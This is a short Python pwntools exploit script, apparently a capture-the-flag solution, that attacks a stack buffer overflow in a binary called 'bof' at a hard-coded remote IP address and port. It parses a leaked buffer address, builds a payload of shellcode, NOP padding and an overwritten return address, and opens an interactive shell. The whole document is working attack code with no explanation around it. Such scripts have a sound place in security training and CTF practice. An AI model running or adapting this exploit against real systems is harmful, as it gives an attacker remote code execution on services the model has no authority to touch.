#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('bof')

host = args.HOST or '139.59.30.165'
port = int(args.PORT or 8900)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvline()
io.recvline()
line = io.recvline().replace('I have a small gift for you (no strings attached)', '').strip()
addr = int(line, 16)
log.info("Buffer address: " + hex(addr))

with open('shellcode64.o', 'rb') as f:
    shellcode = f.read()

# stack layout: buffer + rbp + rip
payload = shellcode + "\x90" * (0x40 - len(shellcode)) + "junk" * 2 + p64(addr)
io.sendline(payload)

io.interactive()

